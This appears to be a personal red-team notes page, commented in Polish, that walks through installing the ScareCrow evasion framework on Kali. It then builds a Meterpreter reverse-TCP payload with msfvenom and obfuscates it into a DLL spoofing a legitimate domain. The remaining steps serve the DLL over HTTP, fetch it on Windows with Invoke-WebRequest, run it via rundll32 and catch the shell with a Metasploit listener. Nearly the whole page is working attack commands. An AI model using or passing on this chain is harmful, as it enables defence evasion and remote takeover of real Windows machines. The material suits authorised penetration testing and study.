---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# ScareCrow Kali

{% code fullWidth="true" %}
```
#instalka
git clone https://github.com/optiv/ScareCrow.git
cd /tools/ScareCrow
apt install golang-go
go get github.com/fatih/color
go get github.com/yeka/zip
go get github.com/josephspurrier/goversioninfo
sudo apt update
apt install openssl
apt install osslsigncode
apt install mingw-w64

go build ScareCrow.go
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```
#tworzymy payload
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.20.10.31 LPORT=8888 -f raw > home/kali/Desktop/test
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```
#obfuskujemy
./ScareCrow -I /home/kali/Desktop/test -Loader dll -domain www.acme.com

#i stworzył ddl
```
{% endcode %}

{% code fullWidth="true" %}
```
#udostępniamy katalog z plikiem
python -m http.server 8081
```
{% endcode %}

**Win**

```
#ściągamy tego dll
Invoke-WebRequest -uri http://10.20.10.31:8081/apphelp.dll -OutFile apphelp.dll
```

**Kali**

```
#uruchamiamy listenera
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
show options
set lhost 10.20.10.31
set lport 8888
run
```

**Win**

```
#uruchamiamy stworzoną dll
rundll32.exe .\apphelp.dll,DllRegisterServer
```
